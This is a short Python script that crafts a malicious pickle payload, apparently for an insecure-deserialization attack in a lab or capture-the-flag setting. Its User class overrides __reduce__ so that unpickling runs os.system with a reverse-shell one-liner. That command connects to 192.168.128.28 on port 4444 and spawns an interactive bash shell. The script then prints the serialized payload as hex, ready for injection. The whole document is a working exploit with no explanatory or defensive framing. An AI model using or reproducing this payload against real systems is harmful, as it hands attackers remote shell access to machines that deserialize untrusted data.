import pickle, os  
class User:
    def __init__(self, root, revenue):
        self.root = root
        self.revenue = revenue
    def __reduce__(self):
        cmd = 'python3 -c \'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.128.28",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
        return (os.system, (cmd,))

data = { User('root',"85000") }
payload = pickle.dumps(data)
print(payload.hex())
